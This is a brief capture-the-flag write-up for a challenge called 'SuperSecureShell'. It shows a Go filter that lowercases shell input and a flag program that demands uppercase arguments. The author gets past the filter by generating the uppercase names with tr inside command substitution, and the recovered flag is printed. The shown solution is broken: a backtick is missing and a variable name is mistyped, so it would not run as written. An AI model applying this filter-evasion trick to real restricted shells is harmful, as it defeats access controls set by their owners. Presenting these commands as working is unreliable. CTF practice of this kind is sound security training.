## Challenge SuperSecureShell
10.10.0.195 - container
ssh on port 2222
inputs are filtered by a go program that runs your shell:

```
buffer = strings.ToLower(buffer)
buffer = strings.Replace(buffer, "*", "", -1)
buffer = strings.Replace(buffer, "?", "", -1)
buffer = strings.Replace(buffer, "\\", "", -1)
```
there is a go program `GETFLAG` that you need to call which is difficult
because capital letters are filtered. also the `GETFLAG` program needs a 
parameter "AGREE" to output the flag:

```
if os.Args[1] == "AGREE" {
		flag, _ := ioutil.ReadFile("/deploy/FLAG.TXT")
		println(string(flag))
		return
	}
``` 
So my solution is to use `tr`:
getflag=`echo "getflag" | tr [:lower:] [:upper:]
agree=`echo "agree" | tr [:lower:] [:upper:]`
./$getflag $agreed

### Flag:
DORF18{Y0UR_5H3LL_15_1N_4N0TH3R_C45TL3}


